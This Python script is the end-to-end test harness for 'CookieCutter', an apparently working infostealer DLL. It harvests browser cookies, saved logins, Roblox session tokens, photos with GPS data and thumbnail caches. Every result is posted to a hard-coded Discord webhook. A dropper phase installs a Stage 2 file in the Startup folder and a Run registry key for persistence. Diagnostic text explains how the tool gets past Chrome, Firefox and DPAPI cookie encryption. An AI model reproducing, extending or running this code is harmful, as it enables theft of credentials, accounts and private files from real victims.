#!/usr/bin/env python3
"""
test_exfil_to_discord.py — End-to-end test that posts the harvest to Discord.

Loads utility.dll via ctypes, calls every export, then POSTs each result to
the configured Discord webhook:
  - GetInfo / GetData / GetLogins / GetSession
    → sent as a JSON embed (operator preview)
  - GetAssets archive (.tar.gz) + manifest
    → manifest as embed, archive as a file attachment
  - GetCache files (thumbcache_*.db)
    → each as a file attachment
  - Final aggregate (meta + harvest summary)
    → sent as the last embed

Local JSON files are still written to disk as a debug backup. Set DRY_RUN=1
to skip the Discord POSTs (just exercise the DLL).

Usage:
    python test_exfil_to_discord.py
    DRY_RUN=1 python test_exfil_to_discord.py    # DLL only, no Discord
    WEBHOOK=...  python test_exfil_to_discord.py # override webhook
"""

import ctypes
import os
import sys
import json
import time
import requests

DLL_PATH  = r"C:\Users\fares\Desktop\CookieCutter\utility.dll"
WEBHOOK   = os.environ.get("WEBHOOK",
    "https://discord.com/api/webhooks/1329497361700880484/"
    "1dpSiIlXdaFSwKiSC3zlnB3aFFzK-WvxS5rf5mvDtOqwX0D1woRAuGau2VSJLdxtge_2")
DRY_RUN   = os.environ.get("DRY_RUN", "0") == "1"
USERNAME  = "CookieCutter Test"
TIMEOUT   = 120  # Discord can be slow on large attachments

# ---------------------------------------------------------------------------
#  Discord helpers
# ---------------------------------------------------------------------------
def post_embed(title, description, color=0xFF6B35, footer=None):
    """POST a JSON embed to the webhook. Returns (ok, status)."""
    if DRY_RUN:
        print(f"  [DRY] embed: {title} ({len(description)} chars)")
        return True, "dry-run"
    body = {
        "username": USERNAME,
        "embeds": [{
            "title": title,
            "description": description[:1900] if description else "",
            "color": color,
        }],
    }
    if footer:
        body["embeds"][0]["footer"] = {"text": footer}
    try:
        r = requests.post(WEBHOOK, json=body, timeout=TIMEOUT)
        return r.status_code < 300, r.status_code
    except Exception as e:
        return False, str(e)

def post_file(file_path, display_name=None):
    """POST a binary file as a Discord attachment. Returns (ok, status)."""
    if not os.path.exists(file_path):
        return False, "file not found"
    sz = os.path.getsize(file_path)
    if sz == 0:
        return False, "file empty"
    display = display_name or os.path.basename(file_path)
    if DRY_RUN:
        print(f"  [DRY] file: {display} ({sz} bytes)")
        return True, "dry-run"
    if sz > 24 * 1024 * 1024:
        return False, f"file too large for Discord ({sz} bytes, cap 25MB)"

    with open(file_path, "rb") as f:
        files = {"files[0]": (display, f, "application/octet-stream")}
        data  = {"payload_json": json.dumps({
            "content": f"📎 **{display}** — {sz:,} bytes",
            "username": USERNAME,
        })}
        try:
            r = requests.post(WEBHOOK, data=data, files=files, timeout=TIMEOUT)
            return r.status_code < 300, r.status_code
        except Exception as e:
            return False, str(e)

# ---------------------------------------------------------------------------
#  DLL load + argtype setup
# ---------------------------------------------------------------------------
def setup_dll(dll):
    """Wire up argtypes/restype for each export. Critical for non-x64 ctypes
    on x64 DLLs — wrong argtypes → ctypes falls back to int, which truncates
    pointers to 32 bits and segfaults on the first call."""
    dll.GetInfo.restype  = ctypes.c_bool
    dll.GetInfo.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t)]

    dll.WriteInfo.restype  = ctypes.c_bool
    dll.WriteInfo.argtypes = [ctypes.c_wchar_p]

    dll.GetData.restype  = ctypes.c_bool
    dll.GetData.argtypes = [ctypes.c_wchar_p]

    dll.GetLogins.restype  = ctypes.c_bool
    dll.GetLogins.argtypes = [ctypes.c_wchar_p]

    dll.GetSession.restype  = ctypes.c_bool
    dll.GetSession.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t)]

    dll.SendData.restype  = ctypes.c_bool
    dll.SendData.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p]

    dll.Cleanup.restype  = None
    dll.Cleanup.argtypes = []

    dll.EnumerateProfiles.restype  = ctypes.c_int
    dll.EnumerateProfiles.argtypes = [ctypes.c_void_p, ctypes.c_int]

    dll.DecryptBlob.restype  = ctypes.c_bool
    dll.DecryptBlob.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                                    ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t)]

    dll.GetAssets.restype  = ctypes.c_bool
    dll.GetAssets.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_size_t]

    dll.GetCache.restype  = ctypes.c_bool
    dll.GetCache.argtypes = [ctypes.c_wchar_p]

    dll.GetDiag.restype  = ctypes.c_int
    dll.GetDiag.argtypes = [ctypes.c_wchar_p]

    dll.Install.restype  = ctypes.c_bool
    dll.Install.argtypes = [ctypes.c_wchar_p]
    dll.UnInstall.restype  = ctypes.c_bool
    dll.UnInstall.argtypes = []
    dll.IsActive.restype  = ctypes.c_bool
    dll.IsActive.argtypes = []

# ---------------------------------------------------------------------------
#  Phase runners
# ---------------------------------------------------------------------------
def run_fingerprint(dll, out_dir):
    """Native fingerprint via the new WriteInfo export."""
    print("\n─── WriteInfo ───")
    out = os.path.join(out_dir, "ru_fingerprint.json")
    ok = dll.WriteInfo(out)
    if not ok or not os.path.exists(out):
        print("  [-] FAILED")
        return None
    with open(out, "r", encoding="utf-8") as f:
        fp = f.read()
    print(f"  [+] {len(fp)} bytes")
    post_embed("🖥️ Fingerprint", "```json\n" + fp[:1800] + "\n```",
               color=0x00BFFF,
               footer=f"fingerprint test • {time.strftime('%H:%M:%S')}")
    return fp

def run_harvest_cookies(dll, out_dir):
    print("\n─── GetData ───")
    out = os.path.join(out_dir, "ru_cookies.json")
    ok = dll.GetData(out)
    if not ok or not os.path.exists(out):
        print("  [-] FAILED or empty")
        return None
    with open(out, "r", encoding="utf-8") as f:
        data = json.load(f)
    cookies = data.get("cookies", [])
    print(f"  [+] {len(cookies)} cookies")

    # Build a compact preview: count by host
    by_host = {}
    for c in cookies:
        h = c.get("host", "?")
        by_host[h] = by_host.get(h, 0) + 1
    preview = f"**{len(cookies)} cookies harvested from {len(by_host)} hosts**\n"
    preview += "```\n"
    for h, n in sorted(by_host.items(), key=lambda x: -x[1])[:20]:
        preview += f"  {n:>4}  {h}\n"
    preview += "```"

    # First ROBLOSECURITY if found
    for c in cookies:
        if c.get("name") == ".ROBLOSECURITY":
            v = c.get("value", "")
            preview += f"\n🎯 **`.ROBLOSECURITY` FOUND** (`{c.get('host','')}`)\n"
            preview += f"```\n{v[:200]}{'...' if len(v) > 200 else ''}\n```"
            break

    post_embed("🍪 Cookies", preview, color=0xFF6B35,
               footer=f"{len(cookies)} cookies")
    return data

def run_harvest_credentials(dll, out_dir):
    print("\n─── GetLogins ───")
    out = os.path.join(out_dir, "ru_creds.json")
    ok = dll.GetLogins(out)
    if not ok or not os.path.exists(out):
        print("  [-] FAILED or empty")
        return None
    with open(out, "r", encoding="utf-8") as f:
        data = json.load(f)
    creds = data.get("credentials", [])
    print(f"  [+] {len(creds)} credentials")

    preview = f"**{len(creds)} credentials harvested**\n```\n"
    for c in creds[:15]:
        preview += f"  {c.get('browser','?'):<10}  {c.get('url',''):<40}  {c.get('username','')}\n"
    preview += "```"
    post_embed("🔑 Credentials", preview, color=0xFF0000,
               footer=f"{len(creds)} credentials")
    return data

def run_roblox_cookie(dll):
    print("\n─── GetSession ───")
    buf = ctypes.create_string_buffer(8192)
    sz  = ctypes.c_size_t(8192)
    ok  = dll.GetSession(buf, ctypes.byref(sz))
    if not ok:
        print("  [-] Not found (not logged into Roblox in any browser)")
        return None
    cookie = buf.value.decode("utf-8", errors="replace")
    print(f"  [+] {sz.value} bytes")
    sent, status = post_embed("🎯 .ROBLOSECURITY",
               f"**Length:** {len(cookie)}\n```\n{cookie[:400]}{'...' if len(cookie) > 400 else ''}\n```",
               color=0x00FF00)
    print(f"  [{'✓' if sent else '✗'}] → Discord: {status}")
    return cookie

def run_roblox_diag(dll, out_dir):
    """Diagnostic: list every .ROBLOSECURITY cookie the DLL can find
    across all browser profiles, with format + decryption status.
    Tells us WHERE the cookie is and WHY GetSession is failing."""
    print("\n─── GetDiag (diagnostic) ───")
    out = os.path.join(out_dir, "ru_roblox_diag.json")
    count = dll.GetDiag(out)
    print(f"  [+] {count} candidate(s)")

    if not os.path.exists(out):
        print("  [-] diagnostic file not written")
        post_embed("🩺 Roblox cookie diagnostic",
                   "**0 candidates found across all profiles**\n"
                   "No .ROBLOSECURITY cookie in any browser's cookie DB.",
                   color=0xFF8800)
        return None

    with open(out, "r", encoding="utf-8") as f:
        data = json.load(f)

    profiles = data.get("profiles_scanned", 0)
    cands    = data.get("candidates", [])

    if not cands:
        msg = (f"**0 candidates found** across {profiles} profiles.\n"
               "No .ROBLOSECURITY cookie in any browser.\n\n"
               "**Likely causes:**\n"
               "• You logged into Roblox via the Roblox Player app, not a browser\n"
               "  (the cookie is in RobloxCookies.dat, not a browser DB)\n"
               "• You're using a brand-new browser profile that we don't enumerate\n"
               "• The cookie was deleted/expired\n"
               "• All your browsers are closed and the cookie was wiped")
        post_embed("🩺 Roblox cookie diagnostic", msg, color=0xFF8800,
                   footer=f"{profiles} profiles scanned")
        return data

    preview = f"**{len(cands)} candidate(s)** across {profiles} profiles\n```\n"
    for c in cands[:20]:
        browser  = c.get("browser", "?")
        host     = c.get("host", "?")
        fmt      = c.get("format", "?")
        status   = c.get("decrypt_status", "?")
        enc_size = c.get("encrypted_size", 0)
        icon = "✅" if status == "ok" else "❌"
        preview += f"  {icon}  {browser:<12}  host={host:<25}  format={fmt:<12}  status={status:<18}  enc={enc_size}B\n"
    preview += "```"
    if len(cands) > 20:
        preview += f"\n_...and {len(cands) - 20} more_"

    # Color: green if any candidate is "ok", orange if found but failed, red if none
    any_ok = any(c.get("decrypt_status") == "ok" for c in cands)
    color  = 0x2ECC71 if any_ok else 0xFF8800
    post_embed("🩺 Roblox cookie diagnostic", preview, color=color,
               footer=f"{len(cands)} candidate(s) • {profiles} profiles scanned")

    # If we found candidates but GetSession couldn't decrypt,
    # this gives us the actionable info
    if not any_ok and cands:
        formats = sorted(set(c.get("format") for c in cands))
        statuses = sorted(set(c.get("decrypt_status") for c in cands))
        diagnosis = (
            f"**GetSession failed because:**\n"
            f"• All candidates are in format: `{', '.join(formats)}`\n"
            f"• All decrypt attempts returned: `{', '.join(statuses)}`\n\n"
            f"**Fix:**\n"
            f"• `fail-v20-elev` → Chrome's IElevator COM failed. Make sure "
            f"Chrome is installed and you're admin, or re-test on the actual target.\n"
            f"• `fail-nss3` → Firefox is installed but the NSS3 path failed. "
            f"Check that the profile has a master password (we only handle empty-pw).\n"
            f"• `fail-dpapi` → Chromium v10 cookie but DPAPI unwrap failed (rare).\n"
            f"• `fail-format` → Cookie is in an unrecognized format."
        )
        post_embed("🔧 Diagnostic conclusion", diagnosis, color=0xFF4444)

    return data

def run_media(dll, out_dir, max_bytes=100 * 1024 * 1024):
    print("\n─── GetAssets ───")
    manifest = os.path.join(out_dir, "ru_media_manifest.json")
    archive  = os.path.join(out_dir, "ru_media.tar.gz")

    # DLL needs the manifest/archive paths as wide strings — pass as c_wchar_p
    ok = dll.GetAssets(manifest, archive, max_bytes)
    if not ok:
        print("  [-] GetAssets returned false")
        return None

    if not os.path.exists(archive):
        print("  [-] archive not created")
        return None

    archive_sz = os.path.getsize(archive)
    print(f"  [+] archive: {archive_sz:,} bytes → {archive}")

    # Read manifest for the embed preview
    manifest_json = ""
    file_count = 0
    if os.path.exists(manifest):
        with open(manifest, "r", encoding="utf-8") as f:
            m = json.load(f)
        file_count = m.get("total_files", 0)
        total_bytes = m.get("total_bytes", 0)
        files = m.get("files", [])
        manifest_json = (
            f"**{file_count} files, {total_bytes:,} bytes total**\n```\n"
        )
        for entry in files[:20]:
            name = entry.get("name", "?")
            sz   = entry.get("size", 0)
            exif = entry.get("exif") or {}
            gps  = ""
            if exif.get("has_gps"):
                gps = f" 📍{exif['gps']['lat']:.4f},{exif['gps']['lon']:.4f}"
            manifest_json += f"  {sz:>10,}  {name}{gps}\n"
        manifest_json += "```"
        if file_count > 20:
            manifest_json += f"\n_...and {file_count - 20} more_"

    # 1) Embed the manifest
    post_embed(f"🖼️ Media Manifest ({file_count} files, {archive_sz:,} bytes)",
               manifest_json, color=0x9B59B6,
               footer="media harvest")

    # 2) Attach the archive
    ok, status = post_file(archive, f"media_{time.strftime('%Y%m%d_%H%M%S')}.tar.gz")
    print(f"  [{'✓' if ok else '✗'}] archive → Discord: {status}")

    return {"archive": archive, "manifest": manifest, "file_count": file_count}

def run_thumbnails(dll, out_dir):
    print("\n─── GetCache ───")
    thumb_dir = os.path.join(out_dir, f"ru_thumbs_{int(time.time())}")
    os.makedirs(thumb_dir, exist_ok=True)

    ok = dll.GetCache(thumb_dir)
    if not ok:
        print("  [-] no cache files copied")
        return None

    # Enumerate what we got
    copied = [f for f in os.listdir(thumb_dir) if f.startswith("thumbcache_")]
    if not copied:
        print("  [-] no thumbcache_*.db in output dir")
        return None

    print(f"  [+] {len(copied)} cache files: {copied}")
    post_embed("🗂️ Thumbnail Cache",
               f"**{len(copied)} cache files copied**\n```\n" +
               "\n".join(f"  {os.path.getsize(os.path.join(thumb_dir, f)):>12,}  {f}"
                         for f in copied) +
               "```",
               color=0x3498DB)

    # Attach each file (they're usually 5-50MB each, well under Discord cap)
    for f in copied:
        path = os.path.join(thumb_dir, f)
        ok, status = post_file(path, f)
        print(f"  [{'✓' if ok else '✗'}] {f} → Discord: {status}")
        # Pace requests so Discord doesn't 429 us
        time.sleep(1.5)

    return thumb_dir

def run_persist(dll):
    """Dropper phase: install a Stage 2 binary that runs on next user login.
    For now drops a placeholder .bat that writes a marker file. Caller
    can swap in a real .exe by passing it to Install."""
    print("\n─── Install (dropper) ───")

    # Clean any leftover install first (idempotent test)
    if dll.IsActive():
        dll.UnInstall()

    ok = dll.Install("")  # placeholder .bat
    print(f"  [{'✓' if ok else '✗'}] Install: {ok}")
    print(f"  [{'✓' if dll.IsActive() else '✗'}] IsActive: {dll.IsActive()}")

    if not ok:
        return None

    # Find what got dropped
    startup = os.path.join(os.environ['APPDATA'],
                           r'Microsoft\Windows\Start Menu\Programs\Startup')
    files = [f for f in os.listdir(startup) if f.endswith(('.bat', '.exe')) and len(f.split('.')[0]) == 8]
    if not files:
        post_embed("📌 Persistence (dropper)",
                   "**Install returned true** but no file found in Startup folder.",
                   color=0xFF0000)
        return None

    dropped = files[0]
    full_path = os.path.join(startup, dropped)
    size = os.path.getsize(full_path)
    with open(full_path, 'r', encoding='utf-8', errors='replace') as f:
        content = f.read() if dropped.endswith('.bat') else "(binary, not shown)"
    print(f"  [+] dropped: {dropped} ({size} bytes)")

    # Read Run-key entry
    import winreg
    run_value = ""
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
            run_value, _ = winreg.QueryValueEx(k, dropped.split('.')[0])
    except FileNotFoundError:
        pass

    preview = (
        f"**Stage 2 dropped:** `{dropped}` ({size} bytes)\n"
        f"**Path:** `{full_path}`\n"
        f"**Run key:** `{dropped.split('.')[0]}` → `{run_value}`\n\n"
        f"**Will execute on next user login.**\n\n"
        f"```\n{content}\n```\n\n"
        f"_Placeholder writes `%TEMP%\\ru_stage2_ran.txt` on first run. "
        f"Swap `Install(\"\")` for `Install(\"C:\\\\path\\\\to\\\\real.exe\")` "
        f"or a URL when ready._"
    )
    post_embed("📌 Persistence (dropper)", preview, color=0xE67E22,
               footer="runs on next user login")

    # Note: we don't uninstall here — leave it in place so the user can verify
    # the chain works by logging out and back in. They'll see the marker file.
    return {"dropped": dropped, "path": full_path, "run_value": run_value}

# ---------------------------------------------------------------------------
#  Main
# ---------------------------------------------------------------------------
def main():
    print("=" * 64)
    print(f"  CookieCutter — End-to-End Test → Discord")
    print(f"  Mode: {'DRY RUN' if DRY_RUN else 'LIVE POST'}")
    print(f"  Webhook: {WEBHOOK[:60]}...")
    print(f"  DLL:     {DLL_PATH}")
    print("=" * 64)

    if not os.path.exists(DLL_PATH):
        print(f"\n[!] DLL not found: {DLL_PATH}")
        print("    Build it first: cd native && build.bat")
        return 1

    dll = ctypes.WinDLL(DLL_PATH)
    setup_dll(dll)
    print(f"\n[+] DLL loaded")

    out_dir = r"C:\Users\fares\Desktop\CookieCutter\test_output"
    os.makedirs(out_dir, exist_ok=True)

    start = time.time()
    results = {}

    results["fingerprint"]  = run_fingerprint(dll, out_dir)
    time.sleep(1)
    results["cookies"]      = run_harvest_cookies(dll, out_dir)
    time.sleep(1)
    results["credentials"]  = run_harvest_credentials(dll, out_dir)
    time.sleep(1)
    results["roblox_diag"]  = run_roblox_diag(dll, out_dir)
    time.sleep(1)
    results["roblox"]       = run_roblox_cookie(dll)
    time.sleep(1)
    results["media"]        = run_media(dll, out_dir)
    time.sleep(1)
    results["thumbnails"]   = run_thumbnails(dll, out_dir)
    time.sleep(1)
    results["persist"]      = run_persist(dll)

    # Cleanup
    print("\n─── Cleanup ───")
    dll.Cleanup()
    print("  [+] cleanup called")

    elapsed = time.time() - start
    summary = {
        "fingerprint":  "✓" if results["fingerprint"] else "—",
        "cookies":      len(results["cookies"]["cookies"]) if results["cookies"] else 0,
        "credentials":  len(results["credentials"]["credentials"]) if results["credentials"] else 0,
        "roblox":       "✓" if results["roblox"] else "—",
        "media_files":  results["media"]["file_count"] if results["media"] else 0,
        "thumb_files":  len(os.listdir(results["thumbnails"])) if results["thumbnails"] else 0,
        "elapsed_sec":  round(elapsed, 1),
    }
    print("\n" + "=" * 64)
    print(f"  Done in {elapsed:.1f}s")
    print(f"  Summary: {summary}")
    print("=" * 64)

    # Final summary embed
    post_embed("✅ Test complete",
               "```json\n" + json.dumps(summary, indent=2) + "\n```",
               color=0x2ECC71,
               footer=f"elapsed {elapsed:.1f}s")
    return 0

if __name__ == "__main__":
    sys.exit(main())
